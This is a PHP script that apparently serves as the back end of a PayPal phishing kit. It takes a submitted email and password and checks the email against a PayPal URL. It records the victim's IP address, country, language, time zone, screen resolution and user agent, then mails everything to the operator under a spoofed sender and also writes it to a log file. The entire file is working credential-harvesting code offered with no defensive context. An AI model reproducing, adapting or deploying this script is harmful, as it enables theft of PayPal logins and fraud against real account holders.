<?php
include 'config.php';
if ( ( isset($_POST['user']) ) && (strlen($_POST['pass']) >= 8)) {
		$_SESSION['PASSWORD'] = $xPassWord =  $_POST['pass'];
   		$_SESSION['EMAIL'] = $xUserName =  $_POST['user'];
    $check    = curl('https://www.paypal.com/cgi-bin/webscr?cmd=_oe-gift-certificate&business=' . urlencode($xUserName) . '&lc=GB&no_note=1&shopping_url=http%3a%2f%2fnafisastore.com&style_color=BLU&currency_code=GBP&bn=PP-GiftCertBF%3abtn_giftCC_LG.gif%3aNonHostedGuest');
if (!stripos($check, 'Error Detected')){
   		$emailarray  = explode('@',$xUserName);
   		$_SESSION['user'] = $emailarray[0];
$xOperatingSystem = $_POST['xOperatingSystem'];
$xUserLanguage = 'Browser Language: ' . $_POST['xLang'] . ' /  Http Accept Language: ' . $_SERVER['HTTP_ACCEPT_LANGUAGE'];
$xTimeZone = $_POST['xTimeZone'];
$_SESSION['Language'] = $Language =  $_POST['Language'];
$xResoLution = $_POST['xResoLution'];
$date_time = @date('d/m/Y h:i a');
$_SESSION['joined'] = $joined = @rand(date('Y') - (7 + -2), date('Y'));
$ip = getenv('REMOTE_ADDR');
$useragent = $_SERVER['HTTP_USER_AGENT'];
    $_result = buka('http://ip-api.com/json/' . $ip);
    if ($_result) {
        $_x_result = json_decode($_result);
        $country = $_x_result->country;
    } else {
        $country = '';
    }
        $message.= "=======================================================\n";
        $message.= "Username  :  ".$xUserName."       \n";
        $message.= "Password  :  ".$xPassWord."      \n";
        $message.= "=======================================================\n";
        $message.= "Client IP  :  ".$ip."           \n";
	$message.= "Sys Language  :  ".$xUserLanguage."      \n";
        $message.= "Date & Time  :  ".$date_time."      \n";
	$message.= "Time Zone  :  ".$xTimeZone."      \n";
        $message.= "Resolution  :  ".$xResoLution."  \n";
        $message.= "User Agent  :  ".$useragent."    \n";
        $message.= "country  :  ".$country."         \n";
        $message.= "=======================================================\n";
        $message.= "IP Link  :  http://ip-api.com/#".$ip."\n";
        $message.= "=======================================================\n";
        $subject = " LOGIN FROM-- [ $ip ] - [$country] -  $xUserName";
        $headers = "From: Hamalt.iq <Rezltppl@loginPaypllRezlt.com>\r\n";
        mail($email,$subject,$message,$headers);
        fwrite($file,$message);
        fclose($file);
	echo 'success_no_tl';
}
else{
	echo 'error_no_tl';

}
}
else{
	echo 'error_no_tl';
}
?>